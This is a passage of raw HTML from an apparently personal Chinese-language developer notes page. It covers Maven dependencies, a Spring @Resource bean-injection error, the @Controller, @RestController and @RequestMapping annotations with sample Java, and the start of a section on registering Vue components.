data-num=\"10\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.baomidou<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>mybatis-plus-generator<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>3.5.5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">&lt;!-- https://mvnrepository.com/artifact/org.apache.velocity/velocity --></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.apache.velocity<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>velocity-engine-core<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>2.2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.freemarker<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>freemarker<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>2.3.28<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>scope</span><span class=\"token punctuation\">></span></span>compile<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>scope</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h2 id=\"18orgspringframeworkbeansfactorybeancreationexception-error-creating-bean-with-name-usercontroller-injection-of-resource-dependencies-failed\"><a class=\"anchor\" href=\"#18orgspringframeworkbeansfactorybeancreationexception-error-creating-bean-with-name-usercontroller-injection-of-resource-dependencies-failed\">#</a> 18.org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'userController': Injection of resource dependencies failed</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h5eV9ibHVlL2FydGljbGUvZGV0YWlscy8xMDQzOTIwNTg/b3BzX3JlcXVlc3RfbWlzYz0lN0IlMjJyZXF1ZXN0JTVGaWQlMjIlM0ElMjIxNzA1NTk0Mzg5MTY4MDAyMTE1MzM4MTUlMjIlMkMlMjJzY20lMjIlM0ElMjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyMiU3RCZhbXA7cmVxdWVzdF9pZD0xNzA1NTk0Mzg5MTY4MDAyMTE1MzM4MTUmYW1wO2Jpel9pZD0wJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmFsbH5iYWlkdV9sYW5kaW5nX3YyfmRlZmF1bHQtMS0xMDQzOTIwNTgtbnVsbC1udWxsLjE0MiU1RXY5OSU1RXBjX3NlYXJjaF9yZXN1bHRfYmFzZTImYW1wO3V0bV90ZXJtPSU0MFJlc291cmNlJUU0JUJEJUJGJUU3JTk0JUE4JUU2JThBJUE1JUU5JTk0JTk5JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==\">Spring 注解 @resource 出现错误_@resource 报错 - CSDN 博客</span></p>\n<p>使用 @Resource 注解 private 实现类实例会报错，但是用 @Autowired (required=false)</p>\n<p>两个注解都是用作 bean 的注入时使用，都是为一个对象变量省去写 get,set 方法，自动为这个对象注入实例化对象（即注入依赖）</p>\n<p><strong>造成报错的原因是</strong>：查找相关资料，<strong>@Resource 注解</strong>是 annotation-api.jar 包中的类，是 jdk1.6 才支持的注解，而 Tomcat6.0 版本以上，已经包含了这个 jar 包，而无需自己导入此包，因此原因是自己项目中 jdk 版本过低。<br />\n在 pom.xml 中添加：</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>javax.annotation<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>javax.annotation-api<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>1.3.2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3VwZXItY2hhby9wLzc4MDg3NDMuaHRtbA==\">https://www.cnblogs.com/super-chao/p/7808743.html</span></p>\n<p><strong>这里 @Resource 报错是因为前面的 UserService 类没有删，导致 @Service 同时出现在两个地方，无法解析依赖</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119090934543.png\" alt=\"image-20240119090934543\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240119095035382.png\" alt=\"image-20240119095035382\" /></p>\n<h2 id=\"19注解controllerrestcontrollerrequestmapping介绍\"><a class=\"anchor\" href=\"#19注解controllerrestcontrollerrequestmapping介绍\">#</a> 19. 注解 @Controller/@RestController/@RequestMapping 介绍</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTA0MTI3MTkvYXJ0aWNsZS9kZXRhaWxzLzY5NzEwNDgw\">https://blog.csdn.net/u010412719/article/details/69710480</span></p>\n<h3 id=\"controller-处理http请求\"><a class=\"anchor\" href=\"#controller-处理http请求\">#</a> @Controller 处理 http 请求</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Controller</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//@ResponseBody</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">,</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果直接使用 @Controller 这个注解，当运行该 SpringBoot 项目后，在浏览器中输入：local:8080/hello, 会得到如下错误提示：</p>\n<p>出现这种情况的原因在于：没有使用模版。即 @Controller 用来响应页面，@Controller 必须配合模版来使用。spring-boot 支持多种模版引擎包括：</p>\n<ol>\n<li>FreeMarker</li>\n<li>Groovy</li>\n<li>Thymeleaf （Spring 官网使用这个）</li>\n<li>Velocity</li>\n<li>JSP （貌似 Spring Boot 官方不推荐，STS 创建的项目会在 src/main/resources 下有个 templates 目录，这里就是让我们放模版文件的，然后并没有生成诸如 SpringMVC 中的 webapp 目录）</li>\n</ol>\n<p>本文以 Thymeleaf 为例介绍使用模版，具体步骤如下：</p>\n<p>第一步：在 pom.xml 文件中添加如下模块依赖：</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>spring-boot-starter-thymeleaf<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>第二步：修改控制器代码，具体为：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * Created by wuranghao on 2017/4/7.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token annotation punctuation\">@Controller</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">,</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>第三步：在 resources 目录的 templates 目录下添加一个 hello.html 文件，具体工程目录结构如下：</p>\n<p>其中，hello.html 文件中的内容为：</p>\n<p>&lt; h1 &gt;wojiushimogui&lt; /h1&gt;</p>\n<p>这样，再次运行此项目之后，在浏览器中输入：localhost:8080/hello</p>\n<p>就可以看到 hello.html 中所呈现的内容了。</p>\n<p>因此，我们就直接使用 @RestController 注解来处理 http 请求来，这样简单的多。</p>\n<h3 id=\"restcontroller\"><a class=\"anchor\" href=\"#restcontroller\">#</a> @RestController</h3>\n<p>Spring4 之后新加入的注解，原来返回 json 需要 @ResponseBody 和 @Controller 配合。</p>\n<p>即 @RestController 是 @ResponseBody 和 @Controller 的组合注解。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">,</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>与下面的代码作用一样</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Controller</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token annotation punctuation\">@ResponseBody</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">,</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"requestmapping-配置url映射\"><a class=\"anchor\" href=\"#requestmapping-配置url映射\">#</a> @RequestMapping 配置 url 映射</h3>\n<p>@RequestMapping 此注解即可以作用在控制器的某个方法上，也可以作用在此控制器类上。</p>\n<p>当控制器在类级别上添加 @RequestMapping 注解时，这个注解会应用到控制器的所有处理器方法上。处理器方法上的 @RequestMapping 注解会对类级别上的 @RequestMapping 的声明进行补充。</p>\n<p>看两个例子</p>\n<p><strong>例子一：@RequestMapping 仅作用在处理器方法上</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">,</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>以上代码 sayHello 所响应的 url=localhost:8080/hello。</p>\n<p><strong>例子二：@RequestMapping 仅作用在类级别上</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * Created by wuranghao on 2017/4/7.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token annotation punctuation\">@Controller</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>以上代码 sayHello 所响应的 url=localhost:8080/hello, 效果与例子一一样，没有改变任何功能。</p>\n<p><strong>例子三：@RequestMapping 作用在类级别和处理器方法上</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * Created by wuranghao on 2017/4/7.</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token annotation punctuation\">@RestController</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/hello\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">HelloController</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"/sayHello\"</span><span class=\"token punctuation\">,</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">=</span><span class=\"token string\">\"/sayHi\"</span><span class=\"token punctuation\">,</span>method<span class=\"token operator\">=</span> <span class=\"token class-name\">RequestMethod</span><span class=\"token punctuation\">.</span><span class=\"token constant\">GET</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">sayHi</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"hi\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这样，以上代码中的 sayHello 所响应的 url=localhost:8080/hello/sayHello。</p>\n<p>sayHi 所响应的 url=localhost:8080/hello/sayHi。</p>\n<p>从这两个方法所响应的 url 可以回过头来看这两句话：当控制器在类级别上添加 @RequestMapping 注解时，这个注解会应用到控制器的所有处理器方法上。处理器方法上的 @RequestMapping 注解会对类级别上的 @RequestMapping 的声明进行补充。</p>\n<p>最后说一点的是 @RequestMapping 中的 method 参数有很多中选择，一般使用 get/post.</p>\n<p><strong>另外</strong>，@PathVaribale/@RequestParam/@GetMapping。</p>\n<p>其中，各注解的作用为：</p>\n<p>@PathVaribale 获取 url 中的数据</p>\n<p>@RequestParam 获取请求参数的值</p>\n<p>@GetMapping 组合注解</p>\n<h2 id=\"20vue注册组件\"><a class=\"anchor\" href=\"#20vue注册组件\">#</a> 20.Vue 注册组件</h2>\n<p>Vue 注册组件有两种，一种是<strong>全局组件</strong>，一种是<strong>局部组件</strong>。整个项目经常用到的用全局写法 ( <code>优点:多次使用,方便省事</code> )，而使用局部组件的情况比较少 (除需要专供特定页面)。</p>\n<p><strong>注册全局组件:</strong></p>\n<p>当你注册完之后，可以在任何组件中直接使用标签，而不需要在各个组件中引入并局部注册 通常公共组件放在 src 文件夹下的 components 文件夹中，这里的组件进行全局注册。</p>\n<p><strong>方法步骤:</strong></p>\n<p>1、在 src 文件夹中新建 components 文件夹，components 文件夹中一般存放组件文件.<br />\n2、在文件夹中新建 components.js 文件<br />\n 3、在 components.js 文件引入所有要注册的全局组件<br />\n 4、在 main.js 中引入 components.js 文件并使用 Vue.use () 全局注册</p>\n<p><strong>代码演示:</strong> <strong>-components.js 文件中</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> 组件名字<span class=\"token constant\">A</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@/components/组件名字A'</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> 组件名字<span class=\"token constant\">B</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@/components/组件名字B '</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">Vue</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"组件名字A\"</span><span class=\"token punctuation\">,</span> 组件名字<span class=\"token constant\">A</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\">// 前者必须是字符串格式</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">'组件名字B'</span><span class=\"token punctuation\">,</span> 组件名字<span class=\"token constant\">B</span> <span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>在 main.js 引入插件</strong></p>\n<figure class=\"highlight gradle\"><figcaption data-lang=\"gradle\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> components from <span class=\"token string\">'@/components/components.js'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Vue<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>components<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>new <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>全局组件的使用 (直接使用)</strong></p>\n<pre><code 